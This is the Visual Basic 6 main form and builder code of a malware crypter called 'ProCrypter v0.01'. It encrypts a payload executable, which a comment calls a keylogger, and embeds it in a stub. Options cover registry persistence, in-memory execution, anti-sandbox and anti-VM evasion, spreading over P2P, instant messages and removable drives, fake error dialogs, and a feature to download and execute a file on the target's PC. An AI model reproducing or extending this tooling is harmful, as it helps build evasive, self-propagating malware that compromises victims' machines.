VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "ProCrypter v0.01"
   ClientHeight    =   6495
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   9630
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6495
   ScaleWidth      =   9630
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton cmdBuild 
      Caption         =   "Build"
      Height          =   495
      Left            =   8280
      TabIndex        =   51
      Top             =   5880
      Width           =   1215
   End
   Begin VB.CheckBox chkUPX 
      Caption         =   "Pack with UPX"
      Height          =   255
      Left            =   6720
      TabIndex        =   50
      Top             =   6000
      Width           =   1455
   End
   Begin VB.CommandButton cmdLoadicon 
      Caption         =   "..."
      Height          =   255
      Left            =   5640
      TabIndex        =   49
      Top             =   6000
      Width           =   375
   End
   Begin VB.TextBox txtIcon 
      Height          =   285
      Left            =   600
      TabIndex        =   48
      Top             =   6000
      Width           =   4935
   End
   Begin VB.Frame Frame6 
      Caption         =   "Spread"
      Height          =   2655
      Left            =   6120
      TabIndex        =   43
      Top             =   3120
      Width           =   3495
      Begin VB.TextBox txtIM 
         Height          =   285
         Left            =   720
         TabIndex        =   58
         Top             =   840
         Width           =   2535
      End
      Begin VB.ListBox lstP2P 
         Height          =   840
         ItemData        =   "frmMain.frx":000C
         Left            =   240
         List            =   "frmMain.frx":000E
         Sorted          =   -1  'True
         TabIndex        =   46
         Top             =   1440
         Width           =   3135
      End
      Begin VB.CheckBox chkSpread 
         Caption         =   "Infect removable devices"
         Height          =   255
         Index           =   1
         Left            =   120
         TabIndex        =   45
         Top             =   480
         Width           =   3255
      End
      Begin VB.CheckBox chkSpread 
         Caption         =   "P2P"
         Height          =   255
         Index           =   0
         Left            =   120
         TabIndex        =   44
         Top             =   240
         Width           =   3255
      End
      Begin VB.Label Label8 
         Caption         =   "IM Msg:"
         Height          =   255
         Left            =   120
         TabIndex        =   57
         Top             =   840
         Width           =   615
      End
      Begin VB.Label Label7 
         Caption         =   "P2P filenames"
         Height          =   255
         Left            =   1200
         TabIndex        =   47
         Top             =   1200
         Width           =   1095
      End
   End
   Begin VB.Frame Frame4 
      Caption         =   "Protection (Ends upon detection of these)"
      Height          =   3015
      Left            =   6120
      TabIndex        =   30
      Top             =   0
      Width           =   3495
      Begin VB.ListBox lstProcesses 
         Height          =   2400
         ItemData        =   "frmMain.frx":0010
         Left            =   1800
         List            =   "frmMain.frx":0012
         Sorted          =   -1  'True
         TabIndex        =   41
         Top             =   480
         Width           =   1575
      End
      Begin VB.CheckBox chkAntiEmu 
         Caption         =   "Anti Norman"
         Height          =   255
         Index           =   0
         Left            =   120
         TabIndex        =   40
         Top             =   360
         Width           =   1575
      End
      Begin VB.CheckBox chkAntiEmu 
         Caption         =   "Anti SoftIce"
         Height          =   255
         Index           =   1
         Left            =   120
         TabIndex        =   39
         Top             =   600
         Width           =   1455
      End
      Begin VB.CheckBox chkAntiEmu 
         Caption         =   "Anti ProcDump"
         Height          =   255
         Index           =   2
         Left            =   120
         TabIndex        =   38
         Top             =   840
         Width           =   1575
      End
      Begin VB.CheckBox chkAntiEmu 
         Caption         =   "Anti CWSandbox"
         Height          =   255
         Index           =   3
         Left            =   120
         TabIndex        =   37
         Top             =   1080
         Width           =   1575
      End
      Begin VB.CheckBox chkAntiEmu 
         Caption         =   "Anti Anubis"
         Height          =   255
         Index           =   4
         Left            =   120
         TabIndex        =   36
         Top             =   1320
         Width           =   1575
      End
      Begin VB.CheckBox chkAntiEmu 
         Caption         =   "Anti JoeBox"
         Height          =   255
         Index           =   5
         Left            =   120
         TabIndex        =   35
         Top             =   1560
         Width           =   1335
      End
      Begin VB.CheckBox chkAntiEmu 
         Caption         =   "Anti SandBoxie"
         Height          =   255
         Index           =   6
         Left            =   120
         TabIndex        =   34
         Top             =   1800
         Width           =   1455
      End
      Begin VB.CheckBox chkAntiEmu 
         Caption         =   "Anti ThreatExpert"
         Height          =   255
         Index           =   7
         Left            =   120
         TabIndex        =   33
         Top             =   2040
         Width           =   1575
      End
      Begin VB.CheckBox chkAntiEmu 
         Caption         =   "Anti Virtual PC"
         Height          =   255
         Index           =   8
         Left            =   120
         TabIndex        =   32
         Top             =   2280
         Width           =   1455
      End
      Begin VB.CheckBox chkAntiEmu 
         Caption         =   "Anti VMware"
         Height          =   255
         Index           =   9
         Left            =   120
         TabIndex        =   31
         Top             =   2520
         Width           =   1455
      End
      Begin VB.Label Label4 
         Caption         =   "Anti Process"
         Height          =   255
         Left            =   2160
         TabIndex        =   42
         Top             =   240
         Width           =   975
      End
   End
   Begin VB.Frame Frame3 
      Caption         =   "Misc"
      Height          =   2655
      Left            =   0
      TabIndex        =   18
      Top             =   3120
      Width           =   6015
      Begin VB.CommandButton cmdHelp 
         Caption         =   "Help"
         Height          =   255
         Left            =   5040
         TabIndex        =   28
         Top             =   2040
         Width           =   855
      End
      Begin VB.TextBox txtURL 
         Height          =   285
         Left            =   1080
         TabIndex        =   27
         Top             =   2040
         Width           =   3855
      End
      Begin VB.Frame Frame5 
         Caption         =   "Fake message (Leave empty for none)"
         Height          =   1575
         Left            =   120
         TabIndex        =   19
         Top             =   360
         Width           =   5775
         Begin VB.OptionButton optFakeInfo 
            Caption         =   "Info"
            Height          =   255
            Left            =   2400
            TabIndex        =   24
            Top             =   1200
            Width           =   3135
         End
         Begin VB.OptionButton optFakeExclamation 
            Caption         =   "Exclamation"
            Height          =   255
            Left            =   1080
            TabIndex        =   23
            Top             =   1200
            Width           =   1215
         End
         Begin VB.OptionButton optFakeCritical 
            Caption         =   "Critical"
            Height          =   255
            Left            =   120
            TabIndex        =   22
            Top             =   1200
            Value           =   -1  'True
            Width           =   855
         End
         Begin VB.TextBox txtFakeTitle 
            Height          =   285
            Left            =   840
            TabIndex        =   21
            Top             =   720
            Width           =   2655
         End
         Begin VB.TextBox txtFakeMsg 
            Height          =   285
            Left            =   840
            TabIndex        =   20
            Top             =   360
            Width           =   4695
         End
         Begin VB.Label Label11 
            Caption         =   "Title:"
            Height          =   255
            Left            =   120
            TabIndex        =   26
            Top             =   720
            Width           =   375
         End
         Begin VB.Label Label10 
            Caption         =   "Message:"
            Height          =   255
            Left            =   120
            TabIndex        =   25
            Top             =   360
            Width           =   735
         End
      End
      Begin VB.Label Label12 
         Caption         =   "URL to exe:"
         Height          =   255
         Index           =   1
         Left            =   120
         TabIndex        =   29
         Top             =   2040
         Width           =   975
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "Installation"
      Height          =   1575
      Left            =   0
      TabIndex        =   7
      Top             =   1440
      Width           =   6015
      Begin VB.CommandButton cmdRandom 
         Caption         =   "Random"
         Height          =   255
         Left            =   5040
         TabIndex        =   56
         Top             =   1080
         Width           =   855
      End
      Begin VB.CheckBox chkPolicies 
         Caption         =   "HKLM (Stealth)"
         Height          =   255
         Left            =   2400
         TabIndex        =   17
         Top             =   600
         Width           =   1455
      End
      Begin VB.TextBox txtStartup 
         Enabled         =   0   'False
         Height          =   285
         Left            =   1080
         MaxLength       =   15
         TabIndex        =   16
         Top             =   600
         Width           =   1215
      End
      Begin VB.TextBox txtActiveX 
         Enabled         =   0   'False
         Height          =   285
         Left            =   1080
         TabIndex        =   14
         Top             =   1080
         Width           =   3855
      End
      Begin VB.CheckBox chkHKLM 
         Caption         =   "HKLM"
         Height          =   255
         Left            =   3960
         TabIndex        =   13
         Top             =   600
         Width           =   855
      End
      Begin VB.OptionButton optExecution 
         Caption         =   "Execute in memory"
         Height          =   255
         Index           =   0
         Left            =   1440
         TabIndex        =   12
         Top             =   240
         Value           =   -1  'True
         Width           =   2175
      End
      Begin VB.CheckBox chkActiveX 
         Caption         =   "ActiveX"
         Height          =   255
         Left            =   120
         TabIndex        =   11
         Top             =   1080
         Width           =   855
      End
      Begin VB.CheckBox chkHKCU 
         Caption         =   "HKCU"
         Height          =   255
         Left            =   4920
         TabIndex        =   10
         Top             =   600
         Width           =   855
      End
      Begin VB.OptionButton optExecution 
         Caption         =   "Execute from harddrive"
         Height          =   255
         Index           =   1
         Left            =   3720
         TabIndex        =   8
         Top             =   240
         Width           =   2055
      End
      Begin VB.Label Label5 
         Caption         =   "Startup key:"
         Height          =   255
         Left            =   120
         TabIndex        =   15
         Top             =   600
         Width           =   975
      End
      Begin VB.Label Label3 
         Caption         =   "Execution type:"
         Height          =   255
         Left            =   120
         TabIndex        =   9
         Top             =   240
         Width           =   1215
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "File"
      Height          =   1335
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   6015
      Begin VB.CommandButton cmdLoadstub 
         Caption         =   "..."
         Height          =   255
         Left            =   5520
         TabIndex        =   54
         Top             =   960
         Width           =   375
      End
      Begin VB.TextBox txtStub 
         Height          =   285
         Left            =   960
         Locked          =   -1  'True
         TabIndex        =   53
         Top             =   960
         Width           =   4455
      End
      Begin VB.TextBox txtOutput 
         Height          =   285
         Left            =   960
         Locked          =   -1  'True
         TabIndex        =   5
         Top             =   600
         Width           =   4455
      End
      Begin VB.CommandButton cmdOutput 
         Caption         =   "..."
         Height          =   255
         Left            =   5520
         TabIndex        =   4
         Top             =   600
         Width           =   375
      End
      Begin VB.TextBox txtInput 
         Height          =   285
         Left            =   960
         Locked          =   -1  'True
         TabIndex        =   2
         Top             =   240
         Width           =   4455
      End
      Begin VB.CommandButton cmdInput 
         Caption         =   "..."
         Height          =   255
         Left            =   5520
         TabIndex        =   1
         Top             =   240
         Width           =   375
      End
      Begin VB.Label Label6 
         Caption         =   "Stub file:"
         Height          =   255
         Left            =   120
         TabIndex        =   55
         Top             =   960
         Width           =   855
      End
      Begin VB.Label Label2 
         Caption         =   "Output file:"
         Height          =   255
         Left            =   120
         TabIndex        =   6
         Top             =   600
         Width           =   855
      End
      Begin VB.Label Label1 
         Caption         =   "Input file:"
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   240
         Width           =   735
      End
   End
   Begin VB.Label Label9 
      Caption         =   "Icon:"
      Height          =   255
      Left            =   120
      TabIndex        =   52
      Top             =   6000
      Width           =   495
   End
   Begin VB.Menu mnuProcessMenu 
      Caption         =   "Processes"
      Visible         =   0   'False
      Begin VB.Menu mnuProcess 
         Caption         =   "Add"
         Index           =   0
      End
      Begin VB.Menu mnuProcess 
         Caption         =   "-"
         Index           =   1
      End
      Begin VB.Menu mnuProcess 
         Caption         =   "Remove"
         Index           =   2
      End
   End
   Begin VB.Menu mnuMessagesMenu 
      Caption         =   "Messages"
      Visible         =   0   'False
      Begin VB.Menu mnuMessages 
         Caption         =   "Add"
         Index           =   0
      End
      Begin VB.Menu mnuMessages 
         Caption         =   "-"
         Index           =   1
      End
      Begin VB.Menu mnuMessages 
         Caption         =   "Remove"
         Index           =   2
      End
   End
   Begin VB.Menu mnuP2PMenu 
      Caption         =   "P2P"
      Visible         =   0   'False
      Begin VB.Menu mnuP2P 
         Caption         =   "Add"
         Index           =   0
      End
      Begin VB.Menu mnuP2P 
         Caption         =   "-"
         Index           =   1
      End
      Begin VB.Menu mnuP2P 
         Caption         =   "Remove"
         Index           =   2
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim ff As Long

Private Sub chkActiveX_Click()
    If chkActiveX.Value = 1 Then
        txtActiveX.Enabled = True
    End If
    If chkActiveX.Value = 0 Then
        txtActiveX = vbNullString
        txtActiveX.Enabled = False
    End If
End Sub

Private Sub chkHKCU_Click()
    If chkPolicies.Value = 0 And chkHKLM.Value = 0 And chkHKCU.Value = 0 Then txtStartup = vbNullString: txtStartup.Enabled = False
    If chkHKCU.Value = 1 Then txtStartup.Enabled = True
End Sub

Private Sub chkHKLM_Click()
    If chkPolicies.Value = 0 And chkHKLM.Value = 0 And chkHKCU.Value = 0 Then txtStartup = vbNullString: txtStartup.Enabled = False
    If chkHKLM.Value = 1 Then txtStartup.Enabled = True
End Sub

Private Sub chkPolicies_Click()
    If chkPolicies.Value = 0 And chkHKLM.Value = 0 And chkHKCU.Value = 0 Then txtStartup = vbNullString: txtStartup.Enabled = False
    If chkPolicies.Value = 1 Then txtStartup.Enabled = True
End Sub

Private Sub cmdBuild_Click()
    On Error Resume Next
    Dim strProcesses As String
    Dim strP2P As String
        
    If txtInput = vbNullString Then MsgBox "No inputfile selected", vbCritical: Exit Sub
    If FileExists(txtInput) = False Then MsgBox "Inputfile doesn't exists", vbCritical: Exit Sub
    If txtOutput = vbNullString Then MsgBox "No ouputfile selected", vbCritical: Exit Sub
    If txtInput = txtOutput Then MsgBox "Choose another output path", vbCritical: Exit Sub
    If txtStub = vbNullString Then MsgBox "No stub selected", vbCritical: Exit Sub
            
    Call FileCopy(txtStub, txtOutput)
            
    If lstProcesses.ListCount > 0 Then
        For i = 0 To lstProcesses.ListCount
            strProcesses = strProcesses & lstProcesses.List(i) & vbFormFeed
        Next i
    End If
    If lstP2P.ListCount > 0 Then
        For i = 0 To lstP2P.ListCount
            strP2P = strP2P & lstP2P.List(i) & vbFormFeed
        Next i
    End If
    
    ff = FreeFile
    Open App.Path & "\settings.ini" For Output As #ff
        Print #ff, strXOR(optExecution(0).Value, "test", True) & _
        "###" & strXOR(optExecution(1).Value, "test", True) & _
        "###" & strXOR(txtStartup, "test", True) & _
        "###" & strXOR(chkPolicies.Value, "test", True) & _
        "###" & strXOR(chkHKLM, "test", True) & _
        "###" & strXOR(chkHKCU, "test", True) & _
        "###" & strXOR(txtActiveX, "test", True) & _
        "###" & strXOR(txtFakeMsg, "test", True) & _
        "###" & strXOR(txtFakeTitle, "test", True) & _
        "###" & strXOR(optFakeCritical.Value, "test", True) & _
        "###" & strXOR(optFakeExclamation.Value, "test", True) & _
        "###" & strXOR(optFakeInfo.Value, "test", True) & _
        "###" & strXOR(txtURL, "test", True) & _
        "###" & strXOR(frmMain.chkAntiEmu(6).Value, "test", True) & _
        "###" & strXOR(frmMain.chkAntiEmu(7).Value, "test", True) & _
        "###" & strXOR(frmMain.chkAntiEmu(4).Value, "test", True) & _
        "###" & strXOR(frmMain.chkAntiEmu(3).Value, "test", True) & _
        "###" & strXOR(frmMain.chkAntiEmu(5).Value, "test", True) & _
        "###" & strXOR(frmMain.chkAntiEmu(8).Value, "test", True) & _
        "###" & strXOR(frmMain.chkAntiEmu(9).Value, "test", True) & _
        "###" & strXOR(chkSpread(0).Value, "test", True) & _
        "###" & strXOR(chkSpread(1).Value, "test", True) & _
        "###" & strXOR(strProcesses, "test", True) & _
        "###" & strXOR(strP2P, "test", True) & _
        "###" & strXOR(txtIM, "test", True)
    Close #ff
    
    Call EncryptFile(txtInput) 'Encrypt the whole file before adding to resource
    Call UpdateRes(txtInput, txtOutput, 52, 31) 'Put the encrypted file as a resource in the stub
    Call UpdateRes(App.Path & "\settings.ini", txtOutput, 52, 32)
    Kill App.Path & "\settings.ini"
    Call CleanEOF(txtOutput) 'Overwrite junkdata at EOF
    If txtIcon <> vbNullString Then Call ReplaceIcon(txtOutput, txtIcon)
    
    If chkUPX.Value = 1 Then
        If FileExists(App.Path & "\upx.exe") Then
            Shell "upx.exe " & Chr(34) & txtOutput & Chr(34), vbHide  'In case user wants to UPX the keylogger
            MsgBox "File successfully packed with UPX", vbInformation
        End If
    End If

    MsgBox "File successfully encrypted", vbInformation

    Call EncryptFile(txtInput) 'Restore the encrypted file by decrpyting it
End Sub

Private Sub cmdHelp_Click()
    MsgBox "This will download and execute a file on the target's PC", vbInformation
End Sub

Private Sub cmdInput_Click()
    txtInput = Browse("exe")
End Sub

Private Sub cmdLoadicon_Click()
    txtIcon = Browse("ico")
End Sub

Private Sub cmdLoadstub_Click()
    txtStub = Browse("bin")
End Sub

Private Sub cmdOutput_Click()
    txtOutput = ShowSaveFileDialog("All files *.*", "exe", App.Path, OFN_OVERWRITEPROMPT)
End Sub

Private Sub cmdRandom_Click()
    If txtActiveX.Enabled <> False Then txtActiveX = GenActiveX
End Sub

Private Sub lstMessages_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then PopupMenu mnuMessagesMenu
End Sub

Private Sub lstP2P_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then PopupMenu mnuP2PMenu
End Sub

Private Sub lstProcesses_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then PopupMenu mnuProcessMenu
End Sub

Private Sub mnuMessages_Click(Index As Integer)
    On Error Resume Next
    Dim strMessages As String
    
    Select Case Index
        Case 0:
            strMessages = InputBox("Enter a message")
            If strMessages <> vbNullString Then lstMessages.AddItem strMessages
        
        Case 2: lstMessages.RemoveItem lstMessages.ListIndex
    End Select
End Sub

Private Sub mnuP2P_Click(Index As Integer)
    On Error Resume Next
    Dim strP2P As String
    
    Select Case Index
        Case 0:
            strP2P = InputBox("Enter a filename")
            If strP2P <> vbNullString Then lstP2P.AddItem strP2P
        
        Case 2: lstP2P.RemoveItem lstP2P.ListIndex
    End Select
End Sub

Private Sub mnuProcess_Click(Index As Integer)
    On Error Resume Next
    Dim strProcess As String
    
    Select Case Index
        Case 0:
            strProcess = InputBox("Enter a process name")
            If strProcess <> vbNullString Then lstProcesses.AddItem strProcess
        
        Case 2: lstProcesses.RemoveItem lstProcesses.ListIndex
    End Select
End Sub

    Private Sub UpdateRes(bmpFile As String, strTarget As String, resType As Long, resID As Long)
        Dim PicBMP() As Byte ' DIB buffer
        Dim rSize As Long
        rSize = FileLen(bmpFile)
        ReDim PicBMP(rSize - 1)
        ff = FreeFile
        Open bmpFile For Binary As ff
            Get ff, , PicBMP ' Here's the DIB bitmap
        Close ff
        
        Dim hUpt As Long, ret As Long
        hUpt = BeginUpdateResource(strTarget, 0) ' use 1 to clear all existing!
        ret = UpdateResource(hUpt, resType, resID, 1035, PicBMP(0), rSize)
        ret = EndUpdateResource(hUpt, 0) ' 0 = change
    End Sub
    
    Private Sub CleanEOF(strFile As String)
        Dim tmpStr As String
        Dim lngPos As Long
        tmpStr = File2Str(strFile)
        
        lngPos = InStr(1, tmpStr, "PADDINGX")
        
        ReDim bufNull(0 To FileLen(strFile) - lngPos) As Byte
        ff = FreeFile
        
        Open strFile For Binary Access Write As ff
            Seek ff, lngPos
            Put ff, , bufNull
        Close ff
    End Sub

Private Sub txtInput_Click()
    txtInput = Browse("exe")
End Sub

Private Sub txtOutput_Click()
    txtOutput = ShowSaveFileDialog("All files *.*", "exe", App.Path, OFN_OVERWRITEPROMPT)
End Sub

Private Sub txtStub_Click()
    txtStub = Browse("bin")
End Sub
